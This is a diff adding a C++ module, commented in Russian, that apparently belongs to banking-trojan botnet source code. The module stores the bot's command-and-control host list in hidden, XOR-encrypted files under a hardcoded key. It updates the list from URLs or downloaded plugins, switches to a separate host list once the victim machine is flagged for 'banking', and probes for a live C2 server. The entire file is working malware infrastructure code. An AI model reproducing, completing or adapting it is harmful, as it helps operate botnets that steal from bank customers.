@@ -1,0 +1,752 @@
+//---------------------------------------------------------------------------
+
+
+#pragma hdrstop
+
+#include <WinSock.h>
+#include <windows.h>
+
+#include "BotCore.h"
+#include "Plugins.h"
+#include "BotHosts.h"
+#include "Utils.h"
+#include "Config.h"
+
+#include "Config.h"
+#include "StrConsts.h"
+
+#include "Modules.h"
+
+//---------------------------------------------------------------------------
+
+
+
+//------------------------------------------------------
+// Константы для работы с файлами хостов
+//------------------------------------------------------
+
+#define HOST_FILE_SIGNATURE  0xFA5E87CD  /* Сигнатура файда хостов */
+#define HOST_BLOCK_SIGNATURE 0x2A8E87CA  /* Сигнатура блока хоста */
+
+#define HOST_FILE_VERSION   1           /* Версия файла хостов */
+
+
+// Пароль шифрования хостов
+const static char HostCryptPassword[] = {'H', 'J', 'G', 's', 'd', 'l', 'k', '8', '7', '3', 'd',  0};
+
+const static char HostsBankingModeSignal[] = {'h', 's', 't', 'b', 'm', 'l', 'd', '.', 's', 'g', 'l',  0};
+
+const static char HostsBankingMode[]   = {'b', 'n', 'k', '.', 'l', 'i', 's', 't',  0};
+const static char HostsNoBankingMode[] = {'n', 'o', 'b', 'n', 'k', '.', 'l', 'i', 's', 't',  0};
+
+
+//------------------------------------------------------
+// Описание заголовка файла хостов
+//------------------------------------------------------
+#pragma pack(push, 1)
+typedef struct THostFileHeader
+{
+	DWORD Signature;   // Сигнатура файла
+	DWORD Version;     // Версия файла
+	DWORD Weight;      // Вес списка в файле
+	DWORD Count;       // Количество хостов в файле
+} *PHostFileHeader;
+#pragma pack(pop)
+
+//------------------------------------------------------
+// Описание заголовка хоста
+//------------------------------------------------------
+#pragma pack(push, 1)
+typedef struct THostBlockHeader
+{
+	DWORD    Signature;   // Сигнатура блока
+	DWORD    Hash;        // Хэш хоста
+	DWORD    Status;      // Статус хоста
+	HOSTTIME CheckTime;   //  Время последней проверки
+	DWORD    Length;      // Длина хоста
+} *PHostBlockHeader;
+#pragma pack(pop)
+
+//---------------------------------------------------------------------------
+
+//***************************************************************************
+//  Методы работы с файлом списка хостов
+//***************************************************************************
+namespace HostsReader
+{
+
+	bool ReadFileHeader(HANDLE File, PHostFileHeader H)
+	{
+		// Функция читает заголовок файла
+        DWORD Readed;
+		pReadFile(File, H, sizeof(THostFileHeader), &Readed, NULL);
+		if (Readed != sizeof(THostFileHeader))
+			return false;
+
+		// Проверяем сигнатуру и версию файла
+		if (H->Signature != HOST_FILE_SIGNATURE || H->Version != HOST_FILE_VERSION)
+		{
+            ClearStruct(*H);
+			return false;
+		}
+		return true;
+	}
+	//-----------------------------------------------------------------------
+
+	bool ReadHostBlock(HANDLE File, PHostBlockHeader H, PCHAR *Host)
+	{
+		// Функция читает блок хоста
+        DWORD Readed;
+		pReadFile(File, H, sizeof(THostBlockHeader), &Readed, NULL);
+		if (Readed != sizeof(THostBlockHeader))
+			return false;
+
+		// Проверяем сигнатуру блока
+		if (H->Signature != HOST_BLOCK_SIGNATURE)
+		{
+			ClearStruct(*H);
+			return false;
+		}
+
+		// Читаем данные хоста
+		if (Host != NULL)
+		{
+			*Host = STR::Alloc(H->Length);
+			if (*Host == NULL)
+				return false;
+
+			pReadFile(File, *Host, H->Length, &Readed, NULL);
+			if (Readed != H->Length)
+			{
+				STR::Free2(*Host);
+				return false;
+            }
+		}
+
+		return true;
+	}
+	//-----------------------------------------------------------------------
+}
+
+
+
+//****************************************************************************
+
+
+void FreeHostRecord(LPVOID Data)
+{
+	// Уничтожаем структуру хоста
+	if (Data == NULL)
+		return;
+
+	PHost Host = (PHost)Data;
+
+	STR::Free(Host->Host);
+    FreeStruct(Host);
+}
+//---------------------------------------------------------------------------
+
+PHostList Hosts::CreateList()
+{
+	// Функция создаёт список хостов.
+	PHostList L = CreateStruct(THostList);
+	if (L == NULL)
+		return NULL;
+
+	L->Weight = HOSTS_WEIGHT_DEFAULT;
+
+	L->Items = List::Create();
+	List::SetFreeItemMehod(L->Items, FreeHostRecord);
+	return L;
+}
+//---------------------------------------------------------------------------
+
+void Hosts::FreeList(PHostList List)
+{
+	// Функция уничтожает список хостов
+	if (List != NULL)
+	{
+		List::Free(List->Items);
+		FreeStruct(List);
+    }
+}
+//---------------------------------------------------------------------------
+
+void Hosts::ClearList(PHostList List)
+{
+	//  ClearList - Функция очищает список хостов
+	if (List != NULL)
+	{
+		List->Weight = HOSTS_WEIGHT_DEFAULT;
+		List::Clear(List->Items);
+    }
+}
+//---------------------------------------------------------------------------
+
+PHost Hosts::AddHost(PHostList List, PCHAR Host)
+{
+	//  Добавить новый хост в список
+	if (List == NULL || STRA::IsEmpty(Host))
+		return NULL;
+
+	PHost Rec = CreateStruct(THost);
+	List::Add(List->Items, Rec);
+
+	Rec->Host = STR::New(Host);
+
+	return Rec;
+}
+//---------------------------------------------------------------------------
+
+PHost Hosts::AddHost(PHostList List, const string &Host)
+{
+	return Hosts::AddHost(List, Host.t_str());
+}
+//---------------------------------------------------------------------------
+
+
+PCHAR __EncodeHost(PCHAR Host)
+{
+	// Функция зашифровывает данные хоста
+    PCHAR Result =STR::New(Host);
+	XORCrypt::Crypt((PCHAR)HostCryptPassword, (LPBYTE)Result, StrCalcLength(Result));
+	return Result;
+}
+
+PCHAR __DecodeHost(PCHAR Host)
+{
+	// Функция расшифрвывает данные хоста
+    PCHAR Result =STR::New(Host);
+	XORCrypt::Crypt((PCHAR)HostCryptPassword, (LPBYTE)Result, StrCalcLength(Result));
+	return Result;
+}
+//---------------------------------------------------------------------------
+
+
+
+bool HostsDoWriteListToFile(HANDLE File, PHostList List)
+{
+	// Функция записывает список хостов в открытый файл
+
+	DWORD Writed = 0;
+
+	// Записываем заголовок файла
+	THostFileHeader H;
+	ClearStruct(H);
+
+	H.Signature = HOST_FILE_SIGNATURE;
+	H.Version   = HOST_FILE_VERSION;
+	H.Weight    = List->Weight;
+	H.Count     = List::Count(List->Items);
+
+	pWriteFile(File, &H, sizeof(H), &Writed, NULL);
+	if (Writed != sizeof(H))
+		return false;
+
+	// Записываем элементы списка
+	for (DWORD i = 0; i < List::Count(List->Items); i++)
+	{
+		PHost Host = (PHost)List::GetItem(List->Items, i);
+		if (Host == NULL || STR::IsEmpty(Host->Host))
+			continue;
+
+
+		// Записываем заголовок блока хоста
+		THostBlockHeader Block;
+		ClearStruct(Block);
+
+		PCHAR TempHost = __EncodeHost(Host->Host);
+
+		Block.Signature = HOST_BLOCK_SIGNATURE;
+		Block.Hash      = CalcHash(Host->Host);
+		Block.Status    = Host->Status;
+        Block.CheckTime = Host->CheckTime;
+		Block.Length    = StrCalcLength(TempHost);
+
+		pWriteFile(File, &Block, sizeof(Block), &Writed, NULL);
+		if (Writed != sizeof(Block))
+		{
+			STR::Free(TempHost);
+			return false;
+		}
+
+		// Записываем хост
+		pWriteFile(File, TempHost, Block.Length, &Writed, NULL);
+		if (Writed != Block.Length)
+		{
+			STR::Free(TempHost);
+			return false;
+        }
+
+        STR::Free(TempHost);
+	}
+
+	return true;
+}
+//---------------------------------------------------------------------------
+
+bool HostsDoLoadListFromFile(HANDLE File, PHostList List)
+{
+	// Функция загружает данные списка хостов из файла
+
+
+	// =================  Читаем заголовок файла  ==================
+
+	THostFileHeader H;
+	if (!HostsReader::ReadFileHeader(File, &H))
+		return false;
+
+	List->Weight = H.Weight;
+
+	// =================  Читаем блоки хостов  ==================
+
+	for (DWORD i = 0; i < H.Count; i++)
+	{
+		// Читаем заголовок блока
+		THostBlockHeader Block;
+		PCHAR Host;
+
+		if (!HostsReader::ReadHostBlock(File, &Block, &Host))
+			return false;
+
+		PHost Rec  = CreateStruct(THost);
+		if (Rec == NULL)
+		{
+			STR::Free(Host);
+			return false;
+		}
+
+		// Копируем данные изи заголовка блока
+		Rec->Status    = Block.Status;
+		Rec->CheckTime = Block.CheckTime;
+		Rec->Host      = __DecodeHost(Host);
+
+		STR::Free(Host);
+
+		List::Add(List->Items, Rec);
+
+	}
+
+	return true;
+
+}
+//---------------------------------------------------------------------------
+
+HANDLE OpenHostsFile(PCHAR FileName, DWORD AccessMode, DWORD ShareMode, DWORD CreationDisposition)
+{
+	// Функция открывает файл со списком хостов
+	// Возможна ситуация когда файл списока хостов будет уже занят,
+	// в этом случае будем повторять попытки открытия файла до тех пор
+	// пока он не освободится
+
+	if (STR::IsEmpty(FileName))
+		return INVALID_HANDLE_VALUE;
+
+	HANDLE File;
+
+	do
+	{
+		File = (HANDLE)pCreateFileA(FileName, AccessMode, ShareMode, NULL, CreationDisposition, FILE_ATTRIBUTE_HIDDEN, NULL);
+
+		if (File == INVALID_HANDLE_VALUE)
+		{
+			// В случае ошибки открытия файла по причине ошиьки
+			// общего доступа (файл в данный момент использыется)
+			// ожидаем некоторое время и пытаемся снова открыть файл.
+			// В противном случае прерываем цикл
+			if (pGetLastError() ==  ERROR_SHARING_VIOLATION)
+				pSleep(50);
+			else
+				break;
+        }
+	}
+	while (File == INVALID_HANDLE_VALUE);
+
+	return File;
+}
+//---------------------------------------------------------------------------
+
+bool Hosts::SaveListToFile(PHostList List, PCHAR FileName, bool IgnoreWeight)
+{
+	// Функция сохраняет список хостов в файл
+	if (List == NULL || STR::IsEmpty(FileName))
+		return false;
+
+	// Открываем файл.
+	// Так как файлом хостов будут пользоваться разные процессы и возможна
+	// одновременная запись
+
+	DWORD Access = (IgnoreWeight) ? GENERIC_WRITE : GENERIC_ALL;
+
+	HANDLE File = OpenHostsFile(FileName, Access, 0,  OPEN_ALWAYS);
+
+	if (File == INVALID_HANDLE_VALUE)
+		return false;
+
+
+	// Проверяем вес списка в файле
+	if (!IgnoreWeight)
+	{
+		DWORD Weight;
+		if ((GetListWeight(File, Weight) && Weight > List->Weight))
+		{
+			// В случае если вес списка из файла выше, то
+			// прерываем запись
+			pCloseHandle(File);
+			return false;
+		}
+    }
+
+    // Обрезаем файл
+	pSetFilePointer(File, 0, 0, FILE_BEGIN);
+	pSetEndOfFile(File);
+
+	// Записываем данные
+    bool Result = HostsDoWriteListToFile(File, List);
+
+
+	// Закрываем файл
+	pCloseHandle(File);
+
+	return Result;
+}
+//---------------------------------------------------------------------------
+
+bool Hosts::LoadListFromFile(PHostList List, PCHAR FileName)
+{
+   //	Функция загружает список хостов из файла
+
+   ClearList(List);
+
+   HANDLE File = OpenHostsFile(FileName, GENERIC_READ, 0, OPEN_EXISTING);
+   if (File == INVALID_HANDLE_VALUE)
+	return false;
+
+   bool Result = HostsDoLoadListFromFile(File, List);
+
+   pCloseHandle(File);
+
+   return Result;
+}
+//---------------------------------------------------------------------------
+
+bool Hosts::GetListWeight(HANDLE File, DWORD &Weight)
+{
+	// Функция возвращает вес списка записанного в файл
+    Weight = 0;
+
+    THostFileHeader H;
+	if (HostsReader::ReadFileHeader(File, &H))
+	{
+		Weight = H.Weight;
+		return true;
+	}
+
+	return false;
+}
+//---------------------------------------------------------------------------
+
+bool Hosts::ExecuteUpdateHostsCommand(LPVOID TaskManager, PCHAR Command, PCHAR Args)
+{
+	// функция выполняет команду обновления списка хостов
+    return UpdateHosts(Args);
+}
+//---------------------------------------------------------------------------
+
+PCHAR HostsGetBankingSignalFile()
+{
+	// Функция возвращает истину если в хосты работают в режиме банкинга
+	return BOT::GetWorkPath(NULL, (PCHAR)HostsBankingModeSignal);
+}
+//---------------------------------------------------------------------------
+
+bool Hosts::UpdateHosts(PCHAR Args)
+{
+
+	//  Функция загружает список хостов и обновляет файл на диске
+
+	// ================ Загружаем список ================
+
+	LPVOID Buffer    = NULL;
+	DWORD BufferSize = 0;
+	bool BufferIsStr = false;
+
+	bool IgnoreWeight = false;
+
+	// Определяем тип параметры
+	// Вариант 1: Парметр начинается с http://
+	if (STR::GetHash(Args, 7, true) == 0x4E0F3408 /* http:// */)
+	{
+		// Загружаем файл со списком хостов
+		if (!HTTP::Get(Args, (PCHAR *)&Buffer, NULL))
+			return false;
+
+		BufferIsStr = true;
+        BufferSize = STR::Length((PCHAR)Buffer);
+	}
+	else
+	{
+		// Вариант 2: Указано короткое имя плагина
+		// Загружаем плагин
+		if (STR::IsEmpty(Args))
+		{
+			// Плагин не указан определяем нужный
+//			PCHAR Signal = HostsGetBankingSignalFile();
+
+//			if (FileExistsA(Signal))
+
+			if (IsBankingMode())
+				Args = (PCHAR)HostsBankingMode;
+            else
+				Args = (PCHAR)HostsNoBankingMode;
+
+            IgnoreWeight = true;
+
+//			STR::Free(Signal);
+        }
+
+
+
+		Buffer = Plugin::Download(Args, NULL, &BufferSize, false);
+	}
+
+	// ================ Обрабатываем загруженный буфер ================
+
+	if (Buffer == NULL)
+		return false;
+
+    bool Result = false;
+
+	// Для более надёжной работы системы хранения и обновления
+	// хостов загруженный буфер сохраняем во временный файл,
+	// затем, в случае успешной загрузки списка из него,
+	// сохраняем список в рабочий файл
+	PCHAR TempFile = File::GetTempNameA();
+	if (TempFile != NULL)
+	{
+        File::WriteBufferA(TempFile, Buffer, BufferSize);
+
+		// Загружаем Список
+		PHostList List = CreateList();
+
+		if (LoadListFromFile(List, TempFile))
+		{
+			// Сохраняем загруженный список в рабочий файл
+			PCHAR WorkFile = BOT::GetHostsFileName();
+			if (WorkFile != NULL)
+			{
+				Result = true;
+                SaveListToFile(List, WorkFile, IgnoreWeight);
+
+                STR::Free(WorkFile);
+            }
+        }
+
+
+        // Уничтожаем данные
+        FreeList(List);
+
+        pDeleteFileA(TempFile);
+        STR::Free(TempFile);
+    }
+
+
+
+	// Освобождаем данные
+	if (BufferIsStr)
+		STR::Free((PCHAR)Buffer);
+	else
+		MemFree(Buffer);
+
+	return Result;
+}
+//---------------------------------------------------------------------------
+
+bool Hosts::GetActiveHostFormFile(PCHAR FileName, PCHAR &Host, bool *FileExists)
+{
+	//  Функция возвращает первый доступный хост из основного списка
+	//  хостов лежащего на диске
+
+	Host = NULL;
+	if (FileExists) *FileExists = false;
+
+	bool FreeFileName = false;
+	if (STR::IsEmpty(FileName))
+	{
+		FileName = BOT::GetHostsFileName();
+		FreeFileName = true;
+	}
+	if (FileName == NULL)
+		return false;
+
+    bool Result = false;
+
+	PHostList List = CreateList();
+
+	if (LoadListFromFile(List, FileName))
+	{
+		if (FileExists) *FileExists = true;
+
+		// Перебираем список и ищем рабочий хост
+		for (DWORD i = 0; i < List::Count(List->Items); i++)
+        {
+			Result = true; // В списке содержатся хосты
+
+			PHost H = (PHost)List::GetItem(List->Items, i);
+			if (H == NULL || STR::IsEmpty(H->Host))
+				continue;
+
+			 if (CheckHost(H->Host))
+			 {
+				 Host = STR::New(H->Host);
+				 break;
+             }
+		}
+    }
+
+    FreeList(List);
+
+
+	if (FreeFileName)
+		STR::Free(FileName);
+
+	return Result;
+}
+//---------------------------------------------------------------------------
+
+
+DWORD WINAPI BankingModeApdateHostsThread(LPVOID Data)
+{
+    Hosts::UpdateHosts(NULL);
+	return 0;
+}
+//---------------------------------------------------------------------------
+
+void Hosts::SetBankingMode()
+{
+	//  Функция включает использования хостов для системы которая
+	//  поймала банкинг
+	PCHAR FileName = HostsGetBankingSignalFile();
+
+	File::WriteBufferA(FileName, NULL, 0);
+
+	STR::Free(FileName);
+}
+//---------------------------------------------------------------------------
+
+
+
+
+//****************************************************************************
+//                               THostChecker
+//****************************************************************************
+
+void _HostChecker_FreeHost(LPVOID Host)
+{
+	delete (string*)Host;
+}
+
+
+
+THostChecker::THostChecker(const char *Hosts, bool HostsEncrypted)
+{
+	FThread = NULL;
+	FCheckTime = 0;
+	FHosts = NULL;
+	FTerminated = false;
+
+	if (AnsiStr::IsEmpty(Hosts))
+		return;
+	FHosts = List::Create();
+    List::SetFreeItemMehod(FHosts, _HostChecker_FreeHost);
+
+	// Распаковываем строки
+	TStrEnum E(Hosts, HostsEncrypted, 0);
+
+	while (E.Next())
+	{
+		string *Host = new string(E.Line());
+		List::Add(FHosts, Host);
+
+		if (FirstHost.IsEmpty())
+			FirstHost = E.Line();
+	}
+}
+//----------------------------------------------------------------------------
+
+
+THostChecker::~THostChecker()
+{
+	FTerminated = true;
+	if (FThread != NULL)
+    	WaitForSingleObject(FThread, INFINITE);
+
+    List::Free(FHosts);
+}
+//----------------------------------------------------------------------------
+
+
+DWORD WINAPI HostCheckerThreadProc(THostChecker *Checker)
+{
+	// Выполняем проверку хостов
+    Checker->DoCheckHosts();
+	return 0;
+}
+//----------------------------------------------------------------------------
+
+
+void THostChecker::Check(bool ReCheck)
+{
+	// Функция запускает проверку хостов
+	if (FThread)
+		return;
+
+	// Проверяем необходимость проверки
+	bool NeedCheck = ReCheck ||
+					 FWorkHost.IsEmpty() ||
+					 (DWORD)pGetTickCount() - FCheckTime >= HostCheckInterval;
+
+	if (NeedCheck)
+	{
+        FWorkHost.Clear();
+		FThread = StartThread(HostCheckerThreadProc, this);
+    }
+}
+//----------------------------------------------------------------------------
+
+string THostChecker::GetWorkHost()
+{
+	//Функция возвращает рабочий хост
+
+	// Запускаем проверку
+	Check(false);
+	// Ожидаем окончания
+	if (FThread)
+		WaitForSingleObject(FThread, 10000);
+
+
+	return FWorkHost;
+}
+//----------------------------------------------------------------------------
+
+void THostChecker::DoCheckHosts()
+{
+	// Ищем рабочий хост
+    DWORD Count = List::Count(FHosts);
+	for (DWORD i = 0; i < Count; i++)
+	{
+		string *Host = (string*)List::GetItem(FHosts, i);
+		if (CheckHost(Host->t_str()))
+		{
+			FWorkHost = *Host;
+            break;
+        }
+	}
+
+
+    FCheckTime = (DWORD)pGetTickCount();
+	FThread = NULL;
+}
+//----------------------------------------------------------------------------
+
+
